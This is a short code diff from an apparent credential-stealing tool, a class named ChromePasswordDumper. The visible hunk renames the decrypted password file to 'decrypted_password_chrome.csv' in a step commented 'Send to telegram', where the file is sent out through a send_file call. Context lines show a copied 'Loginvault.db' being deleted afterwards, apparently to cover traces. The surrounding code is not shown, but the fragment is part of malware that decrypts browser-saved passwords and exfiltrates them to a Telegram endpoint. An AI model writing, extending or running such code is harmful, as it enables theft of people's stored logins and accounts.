@@ -91,8 +91,8 @@ class ChromePasswordDumper:
                         os.remove("Loginvault.db")  
 
             # Send to telegram
-            if os.path.exists('decrypted_password.csv'):
-                response = self.send_file('decrypted_password.csv')  
+            if os.path.exists('decrypted_password_chrome.csv'):
+                response = self.send_file('decrypted_password_chrome.csv')  
                 print('File sent:', response)  
             else:
                 print("[ERR] File not found: decrypted_password.csv")
